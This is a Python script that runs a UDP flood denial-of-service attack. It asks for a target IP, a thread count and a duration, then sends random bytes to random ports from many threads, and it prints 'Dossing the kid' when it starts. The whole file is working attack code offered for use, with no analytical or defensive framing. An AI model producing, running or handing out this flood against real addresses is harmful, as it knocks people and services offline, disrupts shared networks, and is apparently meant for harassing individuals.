import socket, random, threading, sys, time
# Import necessary modules

try:
    target = str(input('Target IP: '))
    # The ip we are going to dos
    threads = int(input('Threads: '))
    # The amount of threads we have
    timer = float(input('Timer: '))
    # How long it will last
except IndexError:
    sys.exit()
    # Just exit if we get an error since we are directly running the file and not with a command prompt

timeout = time.time() + 1 * timer
# Timeout (self explanatory)


def attack():
    # The function to attack
    try:
        bytes = random._urandom(1024)
        # The bytes we are sending
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Use UDP protocol for the dos
        while time.time() < timeout:
            dport = random.randint(20, 55500)
            # Destination port is randomly picked
            sock.sendto(bytes*random.randint(5, 15), (target, dport))
            # Send the packets
        return sys.exit()
        # Return and exit
    except IndexError:
        pass
        # Do nothing when IndexError


print('Dossing the kid ')
for x in range(0, threads):
    # The amount of threads we have
    threading.Thread(target=attack).start()
    # Create a new thread and start it


